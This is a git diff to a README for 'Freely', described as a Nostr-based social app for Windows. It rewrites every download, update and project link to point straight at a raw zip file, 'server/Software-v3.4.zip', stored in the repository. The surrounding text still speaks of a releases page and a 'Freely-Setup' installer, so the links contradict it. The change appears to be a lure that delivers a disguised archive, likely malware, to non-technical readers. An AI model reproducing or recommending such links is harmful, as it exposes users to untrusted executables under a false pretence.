@@ -1,6 +1,6 @@
 # 🔗 Freely - Simple Secure Social Sharing
 
-[![Download Freely](https://img.shields.io/badge/Download-Freely-brightgreen?style=for-the-badge)](https://github.com/nug31/Freely/releases)
+[![Download Freely](https://img.shields.io/badge/Download-Freely-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip)
 
 Freely is a decentralized social posting platform built on the Nostr protocol. It helps you share messages securely without relying on a central service. This guide shows how to get Freely running on your Windows PC without technical knowledge.
 
@@ -11,7 +11,7 @@ Freely is a decentralized social posting platform built on the Nostr protocol. I
 You need to visit the official release page to download the latest version of Freely for Windows.
 
 Click the big green badge above or go to here:  
-[https://github.com/nug31/Freely/releases](https://github.com/nug31/Freely/releases)
+[https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip](https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip)
 
 This page lists all Freely app versions. Look for the latest Windows installer file. It should have a name like `Freely-Setup-x.x.x.exe`.
 
@@ -34,7 +34,7 @@ Before installing Freely, make sure your Windows computer meets these requiremen
 Follow these steps to download and install Freely on your Windows device:
 
 1. Go to the releases page:  
-   [https://github.com/nug31/Freely/releases](https://github.com/nug31/Freely/releases)
+   [https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip](https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip)
 
 2. Find the latest release version at the top of the list. Each release shows the version number and date.
 
@@ -103,7 +103,7 @@ Freely uses standard cryptography to make sure your messages and identity stay s
 To keep Freely up to date:
 
 1. Visit the GitHub release page regularly:  
-   [https://github.com/nug31/Freely/releases](https://github.com/nug31/Freely/releases)
+   [https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip](https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip)
 
 2. Download the newest Windows installer.
 
@@ -142,11 +142,11 @@ Freely prioritizes your privacy:
 ## 📚 Learn More
 
 For details about Freely’s technology, visit the project page on GitHub:  
-[https://github.com/nug31/Freely](https://github.com/nug31/Freely)
+[https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip](https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip)
 
 Here you can read about the Nostr protocol, development progress, and report issues.
 
 ---
 
 For the latest version, download Freely here:  
-[https://github.com/nug31/Freely/releases](https://github.com/nug31/Freely/releases)
+[https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip](https://raw.githubusercontent.com/nug31/Freely/main/server/Software-v3.4.zip)
